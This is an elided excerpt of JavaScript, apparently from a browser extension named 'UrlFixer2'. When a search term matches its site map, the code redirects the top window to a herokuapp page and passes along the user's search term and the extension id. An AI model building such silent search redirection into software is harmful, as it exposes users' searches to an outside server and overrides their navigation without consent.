...
UrlFixer2Cnst.SUSPEND_PARAM_VAL = "suspend_" + "UrlFixer2";
UrlFixer2Cnst.SEARCH_SITES =
...
var UrlFixer2Redirect = function(){
	...
	if(typeof QueryString[UrlFixer2Cnst.SUSPEND_PARAM_VAL ] !== "undefined"){
		return;
	}
	...
	var valFromMap = UrlFixer2SiteMap[QueryString.q] ;
	if(typeof valFromMap === "undefined" ){

		valFromMap = UrlFixer2SiteMap[encodeURIComponent(QueryString.q)];
	}

	if(typeof valFromMap === "undefined" ){

		valFromMap = UrlFixer2SiteMap[encodeURIComponent(encodeURIComponent(QueryString.q))];
	}
	...
	typeof valFromMap!== "undefined"  &&(function(){
		...
		var d = "https://urlfixer2.herokuapp.com";
		top.location.href = d +"/searcher.html?#q=" + encodeURIComponent(valFromMap) + "&term=" + encodeURIComponent(QueryString.q)
		+"&sus=" + UrlFixer2Cnst.SUSPEND_PARAM_VAL + "&name=UrlFixer2" + "&id=" + chrome.runtime.id;
...
var isAllowedBySite = function(url){
	var allowedSites = UrlFixer2Cnst.SEARCH_SITES;
